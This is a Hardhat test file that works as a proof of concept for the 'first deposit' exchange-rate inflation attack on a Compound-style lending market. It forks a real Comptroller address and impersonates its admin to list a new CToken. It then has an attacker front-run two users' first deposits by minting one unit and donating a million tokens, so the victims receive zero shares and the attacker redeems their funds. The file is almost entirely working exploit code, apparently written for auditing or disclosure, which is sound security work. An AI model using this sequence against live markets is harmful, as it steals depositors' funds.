import { expect } from "chai";
import hre, { ethers } from "hardhat";

const { parseUnits, formatUnits } = ethers.utils;

// Temporary ABIs for Contracts
const ComptrollerABI = [
  `function admin() public view returns (address)`,
  `function getAllMarkets() public view returns (address[] memory)`,
  `function _supportMarket(address) public`,
];
const CTokenABI = [
  `function interestRateModel() public view returns (address)`,
  `function getCash() public view returns (uint256)`,
];

describe("First Deposit Bug", function () {
  it("Attack Scenario", async function () {
    const UNDERLYING_DECIMALS = 18;
    const CTOKEN_DECIMALS = 8;
    const UNITROLLER_ADDR = "0x3d9819210A31b4961b30EF54bE2aeD79B9c9Cd3B";

    const [deployer, user1, user2, attacker] = await ethers.getSigners();

    // Deploy a new underlying ERC20 contract
    const Token = await ethers.getContractFactory("Token");
    const UnderlyingC = await Token.deploy(UNDERLYING_DECIMALS);

    // Deploy a new CToken contracts (Delegate & Delegator)
    const CErc20Delegate = await ethers.getContractFactory("CErc20Delegate");
    const cErc20Delegate = await CErc20Delegate.deploy();
    await cErc20Delegate.deployed();

    const totalDecimals = UNDERLYING_DECIMALS + CTOKEN_DECIMALS;
    const initialExcRateMantissaStr = parseUnits("2", totalDecimals);

    const CErc20Delegator = await ethers.getContractFactory("CErc20Delegator");
    const cErc20Delegator = await CErc20Delegator.deploy(
      UnderlyingC.address,
      UNITROLLER_ADDR,
      await getIRModelFromUnitroller(UNITROLLER_ADDR),
      initialExcRateMantissaStr,
      "New CToken",
      "NCT",
      CTOKEN_DECIMALS,
      deployer.address,
      cErc20Delegate.address,
      "0x"
    );
    const CTokenC = cErc20Delegator;

    const ComptrollerC = await ethers.getContractAt(ComptrollerABI, UNITROLLER_ADDR);
    const protocolAdminAddr = await ComptrollerC.admin();
    await hre.network.provider.request({ method: "hardhat_impersonateAccount", params: [protocolAdminAddr] });                  // Impersonate `admin` account so that we can call Comptroller._supportMarket()
    const protocolAdmin = await ethers.getSigner(protocolAdminAddr)
    await ComptrollerC.connect(protocolAdmin)._supportMarket(CTokenC.address);
    /// The newly deployed CToken is added to the lending protocol
    console.log(`CToken deployed to:`, CTokenC.address);

    await UnderlyingC.mint(user1.address, parseUnits("1000000", UNDERLYING_DECIMALS));                                          // Funding user wallets with 1M underlying tokens
    await UnderlyingC.mint(user2.address, parseUnits("1000000", UNDERLYING_DECIMALS));
    await UnderlyingC.mint(attacker.address, parseUnits("2000000", UNDERLYING_DECIMALS));                                       // Funding the attacker wallet with 2M underlying tokens
    expect(await CTokenC.balanceOf(attacker.address)).to.eq(0);                                                                 // Verify that CToken balance of attacker is 0

    console.log(`\nBefore Attack`);
    console.log(`User1 underlying token balance:      ${(formatUnits((await UnderlyingC.balanceOf(user1.address)), UNDERLYING_DECIMALS))}`);
    console.log(`User2 underlying token balance:      ${(formatUnits((await UnderlyingC.balanceOf(user2.address)), UNDERLYING_DECIMALS))}`);
    console.log(`Attacker's underlying token balance: ${(formatUnits((await UnderlyingC.balanceOf(attacker.address)), UNDERLYING_DECIMALS))}`);

    await UnderlyingC.connect(attacker).approve(CTokenC.address, ethers.constants.MaxUint256);

    await UnderlyingC.connect(user1).approve(CTokenC.address, ethers.constants.MaxUint256);                                     // The user starts the first deposit process and issues the token approval txn

    // Now the attacker observes that a user is trying to make a deposit.
    // Since this is the first deposit for this respective CToken, the attacker tries to exploit the bug
    // by frontrunning the user's deposit txn with his specially crafted txns. 
    await CTokenC.connect(attacker).mint(parseUnits("2", CTOKEN_DECIMALS));                                                     // Attacker mints the smallest unit of CToken

    // The attacker now holds 1 unit of CToken token
    expect(await CTokenC.balanceOf(attacker.address)).to.eq(1);
    expect(await CTokenC.totalSupply()).to.eq(1);

    // Now attacker artificially inflates the underlying token balance of the CToken contract by simply transferring 1M underlying tokens to the CToken contract
    await UnderlyingC.connect(attacker).transfer(CTokenC.address, parseUnits("1000000", UNDERLYING_DECIMALS));

    expect(await CTokenC.getCash()).to.eq(parseUnits("1000000", UNDERLYING_DECIMALS).add(parseUnits("2", CTOKEN_DECIMALS)));    // Underlying token balance of CToken contract = 1M Tokens + 2e8 Token units

    await CTokenC.connect(user1).mint(parseUnits("1000000", UNDERLYING_DECIMALS));                                              // The actual user txn now gets validated on chain

    expect(await CTokenC.balanceOf(user1.address)).to.eq(0);                                                                    // Even after depositing 1M underlying tokens the user receives 0 units of CTokens
    expect(await CTokenC.totalSupply()).to.eq(1);                                                                               // CToken's totalSupply is still 1 unit which is held by Attacker

    await CTokenC.connect(attacker).redeem("1");                                                                                // The attacker now simply redeems his CToken balance for entire underlying token balance.
    expect(await UnderlyingC.balanceOf(attacker.address)).to.eq(parseUnits("3000000", UNDERLYING_DECIMALS));                    // The attacker now holds 3M underlying tokens, 2M of his own funds and 1M of user1's funds
    expect(await CTokenC.totalSupply()).to.eq(0);

    console.log(`\nAfter First Attack`);
    console.log(`User1 underlying token balance:      ${(formatUnits((await UnderlyingC.balanceOf(user1.address)), UNDERLYING_DECIMALS))}`);
    console.log(`Attacker's underlying token balance: ${(formatUnits((await UnderlyingC.balanceOf(attacker.address)), UNDERLYING_DECIMALS))}`);

    /// Since CToken's totalSupply has become 0, the same attack can now be performed again on another user and another deposit
    /// The attacker again captures the user's deposit from the protocol
    await UnderlyingC.connect(user2).approve(CTokenC.address, ethers.constants.MaxUint256);

    await CTokenC.connect(attacker).mint(parseUnits("2", CTOKEN_DECIMALS));
    expect(await CTokenC.balanceOf(attacker.address)).to.eq(1);
    expect(await CTokenC.totalSupply()).to.eq(1);
    await UnderlyingC.connect(attacker).transfer(CTokenC.address, parseUnits("1000000", UNDERLYING_DECIMALS));

    expect(await CTokenC.getCash()).to.eq(parseUnits("1000000", UNDERLYING_DECIMALS).add(parseUnits("2", CTOKEN_DECIMALS)));

    await CTokenC.connect(user2).mint(parseUnits("1000000", UNDERLYING_DECIMALS));

    expect(await CTokenC.balanceOf(user2.address)).to.eq(0);
    expect(await CTokenC.totalSupply()).to.eq(1);

    await CTokenC.connect(attacker).redeem("1");
    expect(await UnderlyingC.balanceOf(attacker.address)).to.eq(parseUnits("4000000", UNDERLYING_DECIMALS));
    expect(await CTokenC.totalSupply()).to.eq(0);

    console.log(`\nAfter Second Attack`);
    console.log(`User2 underlying token balance:      ${(formatUnits((await UnderlyingC.balanceOf(user2.address)), UNDERLYING_DECIMALS))}`);
    console.log(`Attacker's underlying token balance: ${(formatUnits((await UnderlyingC.balanceOf(attacker.address)), UNDERLYING_DECIMALS))}`);
  });
});


// Helper function to query an Interest Rate Model contract address
const getIRModelFromUnitroller = async (unitrollerAddr: string) => {
  const ComptrollerC = await ethers.getContractAt(ComptrollerABI, unitrollerAddr);
  const allMarkets = await ComptrollerC.getAllMarkets();
  const CTokenC = await ethers.getContractAt(CTokenABI, allMarkets[allMarkets.length - 1]);
  const irModelAddr = await CTokenC.interestRateModel();
  return irModelAddr;
};
